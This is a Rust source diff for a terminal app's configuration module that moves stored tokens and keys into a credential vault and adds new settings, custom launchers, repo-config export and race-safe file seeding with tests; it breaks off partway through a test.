@@ -1,5 +1,6 @@
 use serde::{Deserialize, Serialize, de::DeserializeOwned};
 use std::collections::HashMap;
+use std::io::Write;
 use std::path::PathBuf;
 
 /// Test-only override for the config directory.
@@ -144,10 +145,14 @@ fn recreate_symlink(source: &std::path::Path, dest: &std::path::Path) -> Result<
 /// so corrupt files are visible in logs instead of silently resetting state.
 pub(crate) fn load_json_config<T: DeserializeOwned + Default>(filename: &str) -> T {
     let path = config_dir().join(filename);
+    load_json_config_from_path(&path)
+}
+
+fn load_json_config_from_path<T: DeserializeOwned + Default>(path: &std::path::Path) -> T {
     if !path.exists() {
         return T::default();
     }
-    let content = match std::fs::read_to_string(&path) {
+    let content = match std::fs::read_to_string(path) {
         Ok(s) => s,
         Err(e) => {
             tracing::warn!(path = %path.display(), "Could not read config: {e}");
@@ -168,7 +173,9 @@ pub(crate) fn persist_atomic(target: &std::path::Path, data: &[u8]) -> Result<()
     if let Some(dir) = target.parent() {
         std::fs::create_dir_all(dir).map_err(|e| format!("Failed to create directory: {e}"))?;
     }
-    let temp = target.with_extension(format!("tmp.{}", std::process::id()));
+    // Unique per-call temp name (uuid) — a per-process name lets two concurrent
+    // writers to the same target collide on the temp file and corrupt it (#117-a503).
+    let temp = target.with_extension(format!("tmp.{}", uuid::Uuid::new_v4()));
     std::fs::write(&temp, data).map_err(|e| format!("Failed to write temp file: {e}"))?;
 
     #[cfg(unix)]
@@ -189,10 +196,17 @@ pub(crate) fn persist_atomic(target: &std::path::Path, data: &[u8]) -> Result<()
 /// Save a JSON config file atomically (temp file + rename).
 /// Sets 0600 permissions on Unix to protect sensitive data.
 pub(crate) fn save_json_config<T: Serialize>(filename: &str, config: &T) -> Result<(), String> {
+    let target = config_dir().join(filename);
+    save_json_config_to_path(&target, config)
+}
+
+fn save_json_config_to_path<T: Serialize>(
+    target: &std::path::Path,
+    config: &T,
+) -> Result<(), String> {
     let json = serde_json::to_string_pretty(config)
         .map_err(|e| format!("Failed to serialize config: {e}"))?;
-    let target = config_dir().join(filename);
-    persist_atomic(&target, json.as_bytes())
+    persist_atomic(target, json.as_bytes())
 }
 
 // ---------------------------------------------------------------------------
@@ -250,8 +264,10 @@ pub(crate) enum OrphanCleanup {
 #[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
 #[serde(rename_all = "lowercase")]
 pub(crate) enum MergeStrategy {
-    #[default]
     Merge,
+    // Squash is the global default (matches the common "squash & merge" PR flow);
+    // per-repo Option<MergeStrategy> overrides still win when set.
+    #[default]
     Squash,
     Rebase,
 }
@@ -309,8 +325,10 @@ pub(crate) struct AuthConfig {
     pub(crate) username: String,
     #[serde(default)]
     pub(crate) password_hash: String,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "String::is_empty")]
     pub(crate) session_token: String,
+    #[serde(default, skip_serializing_if = "is_false")]
+    pub(crate) session_token_exists: bool,
     #[serde(default = "default_session_token_duration_secs")]
     pub(crate) session_token_duration_secs: u64,
     #[serde(default)]
@@ -334,6 +352,7 @@ impl Default for AuthConfig {
             username: String::new(),
             password_hash: String::new(),
             session_token: String::new(),
+            session_token_exists: false,
             session_token_duration_secs: default_session_token_duration_secs(),
             lan_auth_bypass: false,
             auth_rate_limit_max: default_auth_rate_limit_max(),
@@ -389,8 +408,17 @@ pub(crate) struct RelayConfig {
     pub(crate) enabled: bool,
     #[serde(default)]
     pub(crate) url: String,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "String::is_empty")]
     pub(crate) token: String,
+    // `Option<bool>` (unlike the plain `bool` used by session_token_exists /
+    // vapid_private_key_exists) so a partial JSON payload that OMITS this key
+    // (e.g. agent MCP `config/save`, or a partial PUT /config) deserializes to
+    // `None` ("caller didn't touch this") rather than defaulting to `false`
+    // ("caller explicitly cleared it"). preserve_redacted_app_config_secrets
+    // relies on that distinction to avoid silently deleting the stored relay
+    // token — see DATA-1.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub(crate) token_exists: Option<bool>,
     #[serde(default)]
     pub(crate) session_id: String,
 }
@@ -399,8 +427,10 @@ pub(crate) struct RelayConfig {
 pub(crate) struct PushConfig {
     #[serde(default)]
     pub(crate) enabled: bool,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "String::is_empty")]
     pub(crate) vapid_private_key: String,
+    #[serde(default, skip_serializing_if = "is_false")]
+    pub(crate) vapid_private_key_exists: bool,
     #[serde(default)]
     pub(crate) vapid_public_key: String,
     #[serde(default = "default_vapid_subject")]
@@ -412,6 +442,7 @@ impl Default for PushConfig {
         Self {
             enabled: false,
             vapid_private_key: String::new(),
+            vapid_private_key_exists: false,
             vapid_public_key: String::new(),
             vapid_subject: default_vapid_subject(),
         }
@@ -430,27 +461,6 @@ pub(crate) struct ServicesConfig {
     pub(crate) relay: RelayConfig,
     #[serde(default)]
     pub(crate) push: PushConfig,
-}
-
-impl ServicesConfig {
-    #[allow(dead_code)]
-    pub(crate) fn validate(&self) -> Vec<String> {
-        let mut warnings = Vec::new();
-        if self.server.enabled && self.auth.password_hash.is_empty() && !self.auth.lan_auth_bypass {
-            warnings.push(
-                "Remote access enabled with no password and LAN bypass off — \
-                 all connections will require auth but no password is set"
-                    .to_string(),
-            );
-        }
-        if self.relay.enabled && self.relay.token.is_empty() {
-            warnings.push("Relay enabled but relay token is empty".to_string());
-        }
-        if self.push.enabled && self.push.vapid_private_key.is_empty() {
-            warnings.push("Push enabled but VAPID private key is empty".to_string());
-        }
-        warnings
-    }
 }
 
 #[derive(Clone, Serialize, Deserialize)]
@@ -494,6 +504,13 @@ pub(crate) struct AppConfig {
     /// Tab ordering mode: grouped-by-type, terminals-first, or free
     #[serde(default)]
     pub(crate) tab_ordering_mode: TabOrderingMode,
+    /// Cycle through all tab types (terminals + diff/md/editor) with prev/next, not just terminals
+    #[serde(default)]
+    pub(crate) tab_cycling_all_types: bool,
+    /// Show a branch's open terminals as a nested list under its sidebar row
+    /// (only when a branch has more than one terminal). Opt-in, off by default.
+    #[serde(default)]
+    pub(crate) tab_tree_enabled: bool,
     /// Auto-show PR detail popover when a branch has PR data
     #[serde(default = "default_true")]
     pub(crate) auto_show_pr_popover: bool,
@@ -537,6 +554,11 @@ pub(crate) struct AppConfig {
     /// Auto-copy terminal selection to clipboard
     #[serde(default = "default_true")]
     pub(crate) copy_on_select: bool,
+    /// Honor OSC 52 clipboard-write sequences from terminal output. Disable to
+    /// ignore clipboard writes emitted by displayed files/logs. Frontend-gated
+    /// (the OSC 52 write executes in the renderer); stored here for persistence.
+    #[serde(default = "default_true")]
+    pub(crate) osc52_clipboard: bool,
     /// Show last prompt overlay bar at the top of the terminal
     #[serde(default = "default_true")]
     pub(crate) show_last_prompt: bool,
@@ -581,6 +603,36 @@ pub(crate) struct AppConfig {
     /// rejection after. Coordinate those call sites if live reload is ever added.
     #[serde(default)]
     pub(crate) ai_terminal_mcp_enabled: bool,
+    /// Content index pre-warm strategy: "active_and_switch" (default), "active_only", "all_sequential"
+    #[serde(default = "default_index_strategy")]
+    pub(crate) index_strategy: String,
+    /// Minutes of idle + unfocused before SIGSTOP on process group. 0 = disabled.
+    #[serde(default = "default_standby_timeout")]
+    pub(crate) standby_timeout_minutes: u16,
+    /// User-defined launchers shown in the "Open in" menu alongside built-ins.
+    #[serde(default)]
+    pub(crate) custom_launchers: Vec<CustomLauncher>,
+    /// Show GitLens-style inline git blame on the active line in the code editor.
+    #[serde(default = "default_true")]
+    pub(crate) inline_blame_enabled: bool,
+}
+
+/// A user-defined launcher for the "Open in" menu. The executable is spawned
+/// with `args`, each of which may contain `{path}`/`{file}`/`{line}`/`{column}`
+/// placeholders (expanded in `agent::open_in_custom`). No icon field — custom
+/// launchers share a single generic icon in the UI.
+#[derive(Serialize, Deserialize, Clone, Debug, Default)]
+pub(crate) struct CustomLauncher {
+    pub(crate) id: String,
+    pub(crate) name: String,
+    pub(crate) executable: String,
+    #[serde(default)]
+    pub(crate) args: Vec<String>,
+    #[serde(default = "default_true")]
+    pub(crate) enabled: bool,
+    /// Optional platform filter: "macos" | "windows" | "linux". None = all.
+    #[serde(default)]
+    pub(crate) platform: Option<String>,
 }
 
 fn default_language() -> String {
@@ -591,12 +643,24 @@ fn default_vapid_subject() -> String {
     "mailto:noreply@tuicommander.com".to_string()
 }
 
+fn is_false(value: &bool) -> bool {
+    !*value
+}
+
 fn default_update_channel() -> String {
     "stable".to_string()
 }
 
 fn default_session_token_duration_secs() -> u64 {
     86400
+}
+
+fn default_index_strategy() -> String {
+    "active_and_switch".to_string()
+}
+
+fn default_standby_timeout() -> u16 {
+    5
 }
 
 fn default_bell_style() -> String {
@@ -654,6 +718,8 @@ impl Default for AppConfig {
             max_tab_name_length: default_max_tab_name_length(),
             split_tab_mode: SplitTabMode::default(),
             tab_ordering_mode: TabOrderingMode::default(),
+            tab_cycling_all_types: false,
+            tab_tree_enabled: false,
             auto_show_pr_popover: true,
             prevent_sleep_when_busy: false,
             auto_update_enabled: true,
@@ -667,6 +733,7 @@ impl Default for AppConfig {
             intent_tab_title: true,
             suggest_followups: true,
             copy_on_select: true,
+            osc52_clipboard: true,
             show_last_prompt: true,
             bell_style: default_bell_style(),
             global_hotkey: None,
@@ -680,6 +747,10 @@ impl Default for AppConfig {
             cursor_style: default_cursor_style(),
             terminal_renderer: default_terminal_renderer(),
             ai_terminal_mcp_enabled: false,
+            index_strategy: default_index_strategy(),
+            standby_timeout_minutes: default_standby_timeout(),
+            custom_launchers: Vec::new(),
+            inline_blame_enabled: true,
         }
     }
 }
@@ -848,28 +919,28 @@ fn default_settings_nav_width() -> u32 {
 /// but are overridden by per-repo app settings.
 #[derive(Clone, Debug, Default, Serialize, Deserialize)]
 pub(crate) struct RepoLocalConfig {
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) base_branch: Option<String>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) copy_ignored_files: Option<bool>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) copy_untracked_files: Option<bool>,
     // Script fields (setup_script, run_script, archive_script) intentionally
     // omitted — executing repo-committed scripts without TOFU prompt is unsafe.
     // Re-add when trust-on-first-use confirmation is implemented.
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) worktree_storage: Option<WorktreeStorage>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) delete_branch_on_remove: Option<bool>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) auto_archive_merged: Option<bool>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) orphan_cleanup: Option<OrphanCleanup>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) pr_merge_strategy: Option<MergeStrategy>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) after_merge: Option<WorktreeAfterMerge>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
     /// Allowlist of upstream MCP server names relevant to this repo (None = all)
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -1117,6 +1188,11 @@ pub(crate) struct AgentSettings {
     /// Per-agent override for suggested follow-ups. None = use global default.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) suggest_followups: Option<bool>,
+    /// Opt-in: drive busy/idle/awaiting from the agent's native hooks instead of
+    /// output heuristics. Enabling installs hooks into the agent's settings file;
+    /// disabling removes only TUIC's entries. None/false = heuristics (default).
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub(crate) hook_instrumentation: Option<bool>,
 }
 
 #[derive(Clone, Serialize, Deserialize, Default)]
@@ -1222,6 +1298,136 @@ fn migrate_flat_services(val: &mut serde_json::Value) {
     );
 }
 
+fn read_secret(cred: crate::credentials::Credential<'_>) -> Option<String> {
+    match crate::credentials::get(cred) {
+        Ok(value) => value,
+        Err(e) => {
+            tracing::warn!(
+                source = "config",
+                "Failed to read secret from credential vault: {e}"
+            );
+            None
+        }
+    }
+}
+
+fn hydrate_app_config_secrets(config: &mut AppConfig) {
+    if config.services.auth.session_token.is_empty() {
+        if let Some(token) = read_secret(crate::credentials::Credential::RemoteSessionToken) {
+            config.services.auth.session_token = token;
+        }
+    } else if let Err(e) = crate::credentials::set(
+        crate::credentials::Credential::RemoteSessionToken,
+        &config.services.auth.session_token,
+    ) {
+        tracing::warn!(
+            source = "config",
+            "Failed to migrate session token to vault: {e}"
+        );
+    }
+    config.services.auth.session_token_exists = !config.services.auth.session_token.is_empty();
+
+    if config.services.relay.token.is_empty() {
+        if let Some(token) = read_secret(crate::credentials::Credential::RelayToken) {
+            config.services.relay.token = token;
+        }
+    } else if let Err(e) = crate::credentials::set(
+        crate::credentials::Credential::RelayToken,
+        &config.services.relay.token,
+    ) {
+        tracing::warn!(
+            source = "config",
+            "Failed to migrate relay token to vault: {e}"
+        );
+    }
+    config.services.relay.token_exists = Some(!config.services.relay.token.is_empty());
+
+    if config.services.push.vapid_private_key.is_empty() {
+        if let Some(key) = read_secret(crate::credentials::Credential::PushVapidPrivateKey) {
+            config.services.push.vapid_private_key = key;
+        }
+    } else if let Err(e) = crate::credentials::set(
+        crate::credentials::Credential::PushVapidPrivateKey,
+        &config.services.push.vapid_private_key,
+    ) {
+        tracing::warn!(
+            source = "config",
+            "Failed to migrate VAPID private key to vault: {e}"
+        );
+    }
+    config.services.push.vapid_private_key_exists =
+        !config.services.push.vapid_private_key.is_empty();
+}
+
+fn persist_secret(
+    cred: crate::credentials::Credential<'_>,
+    value: &str,
+    exists: bool,
+) -> Result<bool, String> {
+    if !value.is_empty() {
+        crate::credentials::set(cred, value)?;
+        Ok(true)
+    } else if exists {
+        Ok(true)
+    } else {
+        crate::credentials::delete(cred)?;
+        Ok(false)
+    }
+}
+
+fn config_for_disk(mut config: AppConfig) -> Result<AppConfig, String> {
+    config.services.auth.session_token_exists = persist_secret(
+        crate::credentials::Credential::RemoteSessionToken,
+        &config.services.auth.session_token,
+        config.services.auth.session_token_exists,
+    )?;
+    config.services.auth.session_token.clear();
+
+    config.services.relay.token_exists = Some(persist_secret(
+        crate::credentials::Credential::RelayToken,
+        &config.services.relay.token,
+        // `None` (never resolved by preserve_redacted_app_config_secrets) is
+        // treated as "not known to exist" — matches the prior `bool` default.
+        config.services.relay.token_exists.unwrap_or(false),
+    )?);
+    config.services.relay.token.clear();
+
+    config.services.push.vapid_private_key_exists = persist_secret(
+        crate::credentials::Credential::PushVapidPrivateKey,
+        &config.services.push.vapid_private_key,
+        config.services.push.vapid_private_key_exists,
+    )?;
+    config.services.push.vapid_private_key.clear();
+
+    Ok(config)
+}
+
+pub(crate) fn preserve_redacted_app_config_secrets(config: &mut AppConfig, current: &AppConfig) {
+    if config.services.auth.session_token.is_empty() && current.services.auth.session_token_exists {
+        config.services.auth.session_token = current.services.auth.session_token.clone();
+        config.services.auth.session_token_exists = true;
+    }
+    // DATA-1: `token_exists` is `Option<bool>` for relay specifically so we can tell
+    // "caller omitted this field" (None — preserve) apart from "caller explicitly
+    // cleared it" (Some(false) — honor the clear, matches ServicesTab.tsx's
+    // `token_exists = v.length > 0` on the bearer-token input). A partial payload
+    // (agent MCP `config/save`, partial PUT /config) that simply doesn't mention
+    // relay.token_exists must NOT be treated the same as an explicit clear.
+    if config.services.relay.token.is_empty()
+        && config.services.relay.token_exists != Some(false)
+        && current.services.relay.token_exists.unwrap_or(false)
+    {
+        config.services.relay.token = current.services.relay.token.clone();
+        config.services.relay.token_exists = Some(true);
+    }
+    if config.services.push.vapid_private_key.is_empty()
+        && current.services.push.vapid_private_key_exists
+    {
+        config.services.push.vapid_private_key = current.services.push.vapid_private_key.clone();
+        config.services.push.vapid_private_key_exists = true;
+    }
+}
+
 #[cfg_attr(feature = "desktop", tauri::command)]
 pub(crate) fn load_app_config() -> AppConfig {
     let path = config_dir().join(APP_CONFIG_FILE);
@@ -1244,7 +1450,10 @@ pub(crate) fn load_app_config() -> AppConfig {
     };
     migrate_flat_services(&mut val);
     match serde_json::from_value(val) {
-        Ok(cfg) => cfg,
+        Ok(mut cfg) => {
+            hydrate_app_config_secrets(&mut cfg);
+            cfg
+        }
         Err(e) => {
             tracing::error!(path = %path.display(), "Config deserialization failed after migration: {e}. Using defaults.");
             AppConfig::default()
@@ -1254,7 +1463,8 @@ pub(crate) fn load_app_config() -> AppConfig {
 
 #[cfg_attr(feature = "desktop", tauri::command)]
 pub(crate) fn save_app_config(config: AppConfig) -> Result<(), String> {
-    save_json_config(APP_CONFIG_FILE, &config)
+    let disk_config = config_for_disk(config)?;
+    save_json_config(APP_CONFIG_FILE, &disk_config)
 }
 
 // Notification config
@@ -1342,6 +1552,121 @@ pub(crate) fn load_repo_local_config(repo_path: String) -> Option<RepoLocalConfi
     load_repo_local_config_from_path(std::path::Path::new(&repo_path))
 }
 
+/// Overlay a repo's per-repo overrides onto an existing `.tuic.json` config.
+/// Only fields the user explicitly set per-repo (`Some`) are copied; `None`
+/// (inherit-from-global) leaves any existing value in `base` untouched, so the
+/// committed file stays a sparse, intentional set of choices. Script fields are
+/// never copied — `RepoLocalConfig` has none (repo-committed scripts are unsafe
+/// to run without a trust prompt).
+/// Fill the team-shareable worktree/branch fields of a `RepoLocalConfig` with
+/// the global defaults wherever the config doesn't already specify them.
+///
+/// Used when exporting `.tuic.json` so teammates inherit the user's *effective*
+/// settings, not just the (usually empty) set of per-repo overrides. Fields the
+/// config already specifies (e.g. a manually-set `.tuic.json` value) are left
+/// untouched, and `mcp_upstreams` is never populated from defaults (it has none).
+fn fill_repo_local_defaults(
+    mut base: RepoLocalConfig,
+    defaults: &RepoDefaultsConfig,
+) -> RepoLocalConfig {
+    if base.base_branch.is_none() {
+        base.base_branch = Some(defaults.base_branch.clone());
+    }
+    if base.copy_ignored_files.is_none() {
+        base.copy_ignored_files = Some(defaults.copy_ignored_files);
+    }
+    if base.copy_untracked_files.is_none() {
+        base.copy_untracked_files = Some(defaults.copy_untracked_files);
+    }
+    if base.worktree_storage.is_none() {
+        base.worktree_storage = Some(defaults.worktree_storage.clone());
+    }
+    if base.delete_branch_on_remove.is_none() {
+        base.delete_branch_on_remove = Some(defaults.delete_branch_on_remove);
+    }
+    if base.auto_archive_merged.is_none() {
+        base.auto_archive_merged = Some(defaults.auto_archive_merged);
+    }
+    if base.orphan_cleanup.is_none() {
+        base.orphan_cleanup = Some(defaults.orphan_cleanup.clone());
+    }
+    if base.pr_merge_strategy.is_none() {
+        base.pr_merge_strategy = Some(defaults.pr_merge_strategy.clone());
+    }
+    if base.after_merge.is_none() {
+        base.after_merge = Some(defaults.after_merge.clone());
+    }
+    if base.auto_delete_on_pr_close.is_none() {
+        base.auto_delete_on_pr_close = Some(defaults.auto_delete_on_pr_close.clone());
+    }
+    base
+}
+
+fn overlay_repo_local_config(
+    mut base: RepoLocalConfig,
+    entry: &RepoSettingsEntry,
+) -> RepoLocalConfig {
+    if entry.base_branch.is_some() {
+        base.base_branch = entry.base_branch.clone();
+    }
+    if entry.copy_ignored_files.is_some() {
+        base.copy_ignored_files = entry.copy_ignored_files;
+    }
+    if entry.copy_untracked_files.is_some() {
+        base.copy_untracked_files = entry.copy_untracked_files;
+    }
+    if entry.worktree_storage.is_some() {
+        base.worktree_storage = entry.worktree_storage.clone();
+    }
+    if entry.delete_branch_on_remove.is_some() {
+        base.delete_branch_on_remove = entry.delete_branch_on_remove;
+    }
+    if entry.auto_archive_merged.is_some() {
+        base.auto_archive_merged = entry.auto_archive_merged;
+    }
+    if entry.orphan_cleanup.is_some() {
+        base.orphan_cleanup = entry.orphan_cleanup.clone();
+    }
+    if entry.pr_merge_strategy.is_some() {
+        base.pr_merge_strategy = entry.pr_merge_strategy.clone();
+    }
+    if entry.after_merge.is_some() {
+        base.after_merge = entry.after_merge.clone();
+    }
+    if entry.auto_delete_on_pr_close.is_some() {
+        base.auto_delete_on_pr_close = entry.auto_delete_on_pr_close.clone();
+    }
+    if entry.mcp_upstreams.is_some() {
+        base.mcp_upstreams = entry.mcp_upstreams.clone();
+    }
+    base
+}
+
+/// Write the repo's per-repo UI settings into `.tuic.json` at its root so they
+/// can be committed and shared with the team. Preserves any existing `.tuic.json`
+/// values for fields left as inherit-from-global.
+#[cfg_attr(feature = "desktop", tauri::command)]
+pub(crate) fn save_repo_local_config(repo_path: String) -> Result<(), String> {
+    let dir = std::path::Path::new(&repo_path);
+    let entry = load_repo_settings().repos.remove(&repo_path);
+    // Start from the existing .tuic.json so manually-set fields (e.g. mcp_upstreams) survive.
+    let base = load_repo_local_config_from_path(dir).unwrap_or_default();
+    // Fill worktree/branch fields with global defaults so the export captures the
+    // user's effective settings, not just the (usually empty) per-repo overrides —
+    // otherwise a user who relies on global defaults exports an empty {} file.
+    let base = fill_repo_local_defaults(base, &load_repo_defaults());
+    // Per-repo overrides win over both .tuic.json and global defaults.
+    let merged = match entry.as_ref() {
+        Some(e) => overlay_repo_local_config(base, e),
+        None => base,
+    };
+    let json = serde_json::to_string_pretty(&merged).map_err(|e| e.to_string())?;
+    let file = dir.join(REPO_LOCAL_CONFIG_FILE);
+    persist_atomic(&file, json.as_bytes())
+        .map_err(|e| format!("Failed to write {}: {e}", file.display()))?;
+    Ok(())
+}
+
 // Repo defaults (global defaults for all repos)
 #[cfg_attr(feature = "desktop", tauri::command)]
 pub(crate) fn load_repo_defaults() -> RepoDefaultsConfig {
@@ -1353,15 +1678,164 @@ pub(crate) fn save_repo_defaults(config: RepoDefaultsConfig) -> Result<(), Strin
     save_json_config(REPO_DEFAULTS_FILE, &config)
 }
 
+/// Resolve the effective setup script for a repo using the three-tier hierarchy:
+/// per-repo override > global defaults. Returns `None` if the resolved script is empty.
+pub(crate) fn resolve_effective_setup_script(repo_path: &str) -> Option<String> {
+    let settings: RepoSettingsMap = load_json_config(REPO_SETTINGS_FILE);
+    let defaults: RepoDefaultsConfig = load_json_config(REPO_DEFAULTS_FILE);
+    resolve_setup_script_from(&settings, &defaults, repo_path)
+}
+
+fn resolve_setup_script_from(
+    settings: &RepoSettingsMap,
+    defaults: &RepoDefaultsConfig,
+    repo_path: &str,
+) -> Option<String> {
+    if let Some(Some(script)) = settings.repos.get(repo_path).map(|e| &e.setup_script) {
+        return if script.is_empty() {
+            None
+        } else {
+            Some(script.clone())
+        };
+    }
+    if !defaults.setup_script.is_empty() {
+        return Some(defaults.setup_script.clone());
+    }
+    None
+}
+
 // Repositories (opaque JSON — schema owned by frontend)
+
+#[derive(Debug, PartialEq, Eq)]
+enum SeedPublishOutcome {
+    Published,
+    AlreadyExists,
+    NoSource,
+}
+
+fn seed_repository_file_with_before_publish(
+    production_file: &std::path::Path,
+    dev_file: &std::path::Path,
+    before_publish: impl FnOnce(),
+) -> Result<SeedPublishOutcome, String> {
+    if dev_file.exists() {
+        return Ok(SeedPublishOutcome::AlreadyExists);
+    }
+    if !production_file.exists() {
+        return Ok(SeedPublishOutcome::NoSource);
+    }
+
+    let data = std::fs::read(production_file).map_err(|e| {
+        format!(
+            "Failed to read repository seed {}: {e}",
+            production_file.display()
+        )
+    })?;
+    let parent = dev_file
+        .parent()
+        .ok_or_else(|| format!("Repository path has no parent: {}", dev_file.display()))?;
+    std::fs::create_dir_all(parent)
+        .map_err(|e| format!("Failed to create directory {}: {e}", parent.display()))?;
+
+    // Publish through a same-directory hard link. The link operation is atomic
+    // and fails if another process created the dev file first, so migration can
+    // never replace an existing dev repository list.
+    let temp = dev_file.with_extension(format!("tmp.{}", uuid::Uuid::new_v4()));
+    let mut file = std::fs::OpenOptions::new()
+        .write(true)
+        .create_new(true)
+        .open(&temp)
+        .map_err(|e| format!("Failed to create repository seed temp file: {e}"))?;
+    if let Err(e) = file.write_all(&data) {
+        let _ = std::fs::remove_file(&temp);
+        return Err(format!("Failed to write repository seed temp file: {e}"));
+    }
+    drop(file);
+
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        if let Err(e) = std::fs::set_permissions(&temp, std::fs::Permissions::from_mode(0o600)) {
+            let _ = std::fs::remove_file(&temp);
+            return Err(format!("Failed to set repository seed permissions: {e}"));
+        }
+    }
+
+    before_publish();
+    let result = match std::fs::hard_link(&temp, dev_file) {
+        Ok(()) => Ok(SeedPublishOutcome::Published),
+        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {
+            Ok(SeedPublishOutcome::AlreadyExists)
+        }
+        Err(e) => Err(format!(
+            "Failed to publish repository seed {}: {e}",
+            dev_file.display()
+        )),
+    };
+    let _ = std::fs::remove_file(&temp);
+    result
+}
+
+fn seed_repository_file(
+    production_file: &std::path::Path,
+    dev_file: &std::path::Path,
+) -> Result<(), String> {
+    seed_repository_file_with_before_publish(production_file, dev_file, || {}).map(|_| ())
+}
+
+fn repository_file_for_build(
+    debug: bool,
+    production_config_dir: &std::path::Path,
+    dev_config_dir: &std::path::Path,
+) -> PathBuf {
+    let production_file = production_config_dir.join(REPOSITORIES_FILE);
+    if !debug {
+        return production_file;
+    }
+
+    let dev_file = dev_config_dir.join(REPOSITORIES_FILE);
+    if let Err(e) = seed_repository_file(&production_file, &dev_file) {
+        tracing::warn!(error = %e, "Failed to seed development repositories");
+    }
+    dev_file
+}
+
+fn repository_file_from_home(
+    debug: bool,
+    production_config_dir: &std::path::Path,
+    home_dir: &std::path::Path,
+) -> PathBuf {
+    repository_file_for_build(
+        debug,
+        production_config_dir,
+        &home_dir.join(".tuicommander-dev"),
+    )
+}
+
+fn repository_file() -> PathBuf {
+    #[cfg(test)]
+    {
+        // Preserve the config-dir override contract for tests in other modules;
+        // isolation behavior is covered through the explicit-path resolver.
+        config_dir().join(REPOSITORIES_FILE)
+    }
+
+    #[cfg(not(test))]
+    {
+        let production_config_dir = config_dir();
+        let home_dir = dirs::home_dir().unwrap_or_else(|| PathBuf::from("."));
+        repository_file_from_home(cfg!(debug_assertions), &production_config_dir, &home_dir)
+    }
+}
+
 #[cfg_attr(feature = "desktop", tauri::command)]
 pub(crate) fn load_repositories() -> serde_json::Value {
-    load_json_config(REPOSITORIES_FILE)
+    load_json_config_from_path(&repository_file())
 }
 
 #[cfg_attr(feature = "desktop", tauri::command)]
 pub(crate) fn save_repositories(config: serde_json::Value) -> Result<(), String> {
-    save_json_config(REPOSITORIES_FILE, &config)
+    save_json_config_to_path(&repository_file(), &config)
 }
 
 // Pane layout (schema owned by frontend)
@@ -1580,6 +2054,201 @@ mod tests {
         read_back
     }
 
+    fn read_json(path: &std::path::Path) -> serde_json::Value {
+        serde_json::from_slice(&fs::read(path).unwrap()).unwrap()
+    }
+
+    #[test]
+    fn debug_repositories_seed_only_once() {
+        let dir = TempDir::new().unwrap();
+        let production_dir = dir.path().join("production");
+        let dev_dir = dir.path().join("dev");
+        fs::create_dir_all(&production_dir).unwrap();
+        let production_file = production_dir.join(REPOSITORIES_FILE);
+        fs::write(&production_file, br#"{"repos":{"/production":{}}}"#).unwrap();
+
+        let first = repository_file_for_build(true, &production_dir, &dev_dir);
+        assert_eq!(
+            read_json(&first)["repos"]["/production"],
+            serde_json::json!({})
+        );
+
+        fs::write(&production_file, br#"{"repos":{"/changed":{}}}"#).unwrap();
+        let second = repository_file_for_build(true, &production_dir, &dev_dir);
+        assert_eq!(first, second);
+        assert_eq!(
+            read_json(&second)["repos"]["/production"],
+            serde_json::json!({})
+        );
+        assert!(read_json(&second)["repos"].get("/changed").is_none());
+    }
+
+    #[test]
+    fn concurrent_first_run_seed_keeps_the_published_winner() {
+        let dir = TempDir::new().unwrap();
+        let first_production = dir.path().join("production-first.json");
+        let second_production = dir.path().join("production-second.json");
+        let dev_file = dir.path().join("dev").join(REPOSITORIES_FILE);
+        let first_data = br#"{"repos":{"/first":{}}}"#;
+        let second_data = br#"{"repos":{"/second":{}}}"#;
+        fs::write(&first_production, first_data).unwrap();
+        fs::write(&second_production, second_data).unwrap();
+
+        let barrier = std::sync::Arc::new(std::sync::Barrier::new(2));
+        let first_barrier = std::sync::Arc::clone(&barrier);
+        let second_barrier = std::sync::Arc::clone(&barrier);
+        let first_dev_file = dev_file.clone();
+        let second_dev_file = dev_file.clone();
+
+        let first = std::thread::spawn(move || {
+            let outcome = seed_repository_file_with_before_publish(
+                &first_production,
+                &first_dev_file,
+                || {
+                    first_barrier.wait();
+                },
+            )
+            .unwrap();
+            (outcome, first_data.as_slice())
+        });
+        let second = std::thread::spawn(move || {
+            let outcome = seed_repository_file_with_before_publish(
+                &second_production,
+                &second_dev_file,
+                || {
+                    second_barrier.wait();
+                },
+            )
+            .unwrap();
+            (outcome, second_data.as_slice())
+        });
+
+        let results = [first.join().unwrap(), second.join().unwrap()];
+        assert_eq!(
+            results
+                .iter()
+                .filter(|(outcome, _)| *outcome == SeedPublishOutcome::Published)
+                .count(),
+            1
+        );
+        assert_eq!(
+            results
+                .iter()
+                .filter(|(outcome, _)| *outcome == SeedPublishOutcome::AlreadyExists)
+                .count(),
+            1
+        );
+
+        let winner_data = results
+            .iter()
+            .find_map(|(outcome, data)| {
+                (*outcome == SeedPublishOutcome::Published).then_some(*data)
+            })
+            .unwrap();
+        assert_eq!(fs::read(dev_file).unwrap(), winner_data);
+    }
+
+    #[test]
+    fn debug_repositories_persist_across_restart() {
+        let dir = TempDir::new().unwrap();
+        let production_dir = dir.path().join("production");
+        let dev_dir = dir.path().join("dev");
+        fs::create_dir_all(&production_dir).unwrap();
+        fs::write(
+            production_dir.join(REPOSITORIES_FILE),
+            br#"{"repos":{"/seed":{}}}"#,
